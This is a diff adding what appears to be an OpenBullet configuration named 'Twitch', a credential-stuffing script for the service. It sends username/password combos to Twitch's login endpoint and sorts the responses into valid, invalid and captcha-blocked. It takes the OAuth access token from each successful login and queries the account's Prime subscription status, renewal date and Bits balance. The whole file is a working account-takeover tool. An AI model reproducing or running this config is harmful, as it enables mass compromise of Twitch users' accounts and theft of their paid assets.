@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "Twitch",
+  "SuggestedBots": 1,
+  "LastModified": "2019-06-30T12:56:28.6207705-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://passport.twitch.tv/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"client_id\":\"kimne78kx3ncx6brgo4mv6wki5h1ko\",\"undelete_user\":false}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "X-Requested-With: com.android.browser" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; google Pixel 2 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+    KEY "Invalid username" 
+    KEY "This account needs a password reset" 
+    KEY "Invalid Password." 
+    KEY "suspended user" 
+    KEY "Please enter your username and password" 
+    KEY "no such user" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Ban OR 
+    KEY "Please complete the CAPTCHA correctly" 
+    KEY "captcha_proof" 
+    KEY "Please login to browse the internet" 
+    KEY "You have been identified as anonymous" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 
+
+PARSE "<COOKIES(login)>" JSON "" -> CAP "Username" 
+
+REQUEST POST "https://gql.twitch.tv/gql" 
+  CONTENT "[{\"operationName\":\"PrimeSubscribe_UserPrimeData\",\"variables\":{\"login\":\"<Username>\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"58c25a2b0ccbde33498f3a5cf6027ff32168febd8a63b749f184028e8ab9192a\"}}}]" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "Authorization: OAuth <TOKEN>" 
+  HEADER "X-Requested-With: com.android.browser" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; google Pixel 2 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "canPrimeSubscribe" -> CAP "Prime" 
+
+IF "<SOURCE>" Contains "willRenew":true"
+
+PARSE "<SOURCE>" JSON "renewalDate" -> CAP "Prime Renew Date" 
+
+ENDIF
+
+REQUEST POST "https://gql.twitch.tv/gql" 
+  CONTENT "[{\"operationName\":\"BitsCard_Bits\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"fe1052e19ce99f10b5bd9ab63c5de15405ce87a1644527498f0fc1aadeff89f2\"}}},{\"operationName\":\"BitsCard_MainCard\",\"variables\":{\"name\":\"214062798\",\"withCheerBombEventEnabled\":false},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"88cb043070400a165104f9ce491f02f26c0b571a23b1abc03ef54025f6437848\"}}}]" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "Authorization: OAuth <TOKEN>" 
+  HEADER "X-Requested-With: com.android.browser" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; google Pixel 2 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "bitsBalance" -> CAP "Bits" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<Prime>" EqualTo "False" 
+    KEY "<Bits>" LessThan "1" 
+
